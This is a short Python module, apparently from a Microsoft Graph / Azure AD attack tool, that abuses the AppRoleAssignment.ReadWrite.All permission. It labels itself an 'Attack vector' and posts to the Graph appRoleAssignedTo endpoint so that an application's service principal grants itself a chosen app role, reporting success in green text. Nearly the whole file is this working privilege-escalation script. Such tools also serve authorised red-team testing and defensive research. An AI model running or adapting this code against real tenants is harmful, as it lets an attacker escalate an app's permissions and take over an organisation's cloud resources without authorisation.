import requests
import colorama
from colorama import Fore, Style


def AppAssign_Vectors(request_headers, AppAssignSettings):
    print()
    print(
        "AppRoleAssignment.ReadWrite.All  - desc")
    print()
    try:
        print("Attack vector - Allows the app to manage permission grants for application permissions to any API (including Microsoft Graph) and application assignments for any app, without a signed-in user.")

        create_message_URL = "https://graph.microsoft.com/beta/servicePrincipals/" + AppAssignSettings["clientId"] + "/appRoleAssignedTo"
        message_obj = {
          "appRoleId": AppAssignSettings["roleId"],
          "resourceId": AppAssignSettings["ResourceId"],
          "principalId": AppAssignSettings["clientId"]
        }

        result = requests.post(create_message_URL, json=message_obj, headers=request_headers)
        if result.status_code == 400:
            json = result.json()
            error = json["error"]
            message = error["message"]
            if message == "Permission being assigned already exists on the object":
                print(Fore.GREEN + "Seems like the permission is already there.")
                print(Style.RESET_ALL)
        elif result.status_code == 201:
            print(Fore.GREEN + "Added role to " + AppAssignSettings["clientId"])
            print(Style.RESET_ALL)

    except:
        pass
